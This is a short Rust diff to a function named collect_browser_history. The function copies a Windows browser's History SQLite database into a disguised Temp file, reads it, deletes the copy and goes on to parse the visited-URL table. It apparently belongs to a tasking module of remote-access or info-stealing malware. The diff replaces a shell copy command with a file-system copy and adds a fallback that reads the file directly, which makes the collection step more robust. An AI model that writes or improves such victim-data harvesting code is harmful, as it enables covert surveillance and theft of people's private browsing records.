@@ -645,11 +645,15 @@ fn collect_browser_history(v: &serde_json::Value) -> TaskOutput {
     };
 
     let tmp = format!("{local}\\Temp\\~hist_{}.tmp", std::process::id());
-    let cmd = format!("copy /Y \"{history_path}\" \"{tmp}\" 2>nul");
-    let _ = shell_run(&cmd);
-    let db = match std::fs::read(&tmp) {
-        Ok(b) => { let _ = std::fs::remove_file(&tmp); b }
-        Err(e) => return TaskOutput::failure(&format!("browser-history: {e}")),
+    let db = if std::fs::copy(&history_path, &tmp).is_ok() {
+        let b = std::fs::read(&tmp).unwrap_or_default();
+        let _ = std::fs::remove_file(&tmp);
+        b
+    } else {
+        match std::fs::read(&history_path) {
+            Ok(b)  => b,
+            Err(e) => return TaskOutput::failure(&format!("browser-history: {e}")),
+        }
     };
 
     // Parse `urls` table from History SQLite
